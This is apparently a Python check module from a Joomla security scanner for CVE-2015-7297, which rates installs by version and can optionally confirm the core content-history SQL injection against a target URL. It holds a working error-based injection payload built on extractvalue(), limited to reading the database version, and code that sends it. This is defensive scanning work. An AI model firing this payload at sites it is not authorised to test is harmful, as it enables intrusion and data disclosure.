from __future__ import annotations

import re
from typing import Any

from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding
from .contenthistory_sqli import run_differential

CVE_ID = "CVE-2015-7297"
NAME = "Joomla core content history SQL injection"
AFFECTED_RULE = "Joomla 3.2.0 through 3.4.4"
# Read-only error-based payload: extractvalue() echoes the database version in
# the XPath error. The injected expression only reads the version string.
PAYLOAD = "1,extractvalue(1,concat(0x7e,(select version())))"
SIGNATURE = "XPATH syntax error"
VERSION_RE = re.compile(r"XPATH syntax error:\s*(?:&#0?39;|')?~([A-Za-z0-9._\-]+)")


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parsed < parse_version_required("3.2.0"):
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < parse_version_required("3.4.5") else "PATCHED"


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    **kwargs: Any,
):
    finding = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation="Upgrade Joomla to 3.4.5 or a currently supported release.",
    )
    finding.exploit_available = True
    if not run_exploit_check or finding.status != "LIKELY_VULNERABLE":
        return finding
    if exploit_mode != "safe":
        finding.detail += " This module only supports safe differential verification."
        return finding

    result = run_differential(
        target_url,
        PAYLOAD,
        method="GET",
        signature=SIGNATURE,
        timeout=timeout,
        proxy=proxy,
    )
    finding.exploit_ran = True
    finding.proof_url = result["proof_url"]
    finding.evidence = result["evidence"]
    if result["confirmed"]:
        version_match = VERSION_RE.search(result["probe"].get("body", "") or "")
        if version_match:
            finding.evidence["database_version"] = version_match.group(1)
        finding.status = "VULNERABLE"
        finding.confidence = "CONFIRMED"
        finding.detail = (
            "The unauthenticated content-history request accepted a control value but returned a "
            "database XPath error for an injected extractvalue() expression, which also disclosed "
            "the database version. No rows were read or modified beyond that version string."
        )
    else:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = (
            "The content-history SQL differential did not produce a unique database error. "
            f"Control HTTP {result['evidence']['control_status']}; "
            f"probe HTTP {result['evidence']['probe_status']}."
        )
    return finding


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": [">=3.2.0,<3.4.5"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": False,
        "vulnerability_type": "SQL Injection",
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-12",
        "updated": "2026-11-12",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2015-7297",
            "https://developer.joomla.org/security-centre/628-20151001-core-sql-injection.html",
        ],
    }
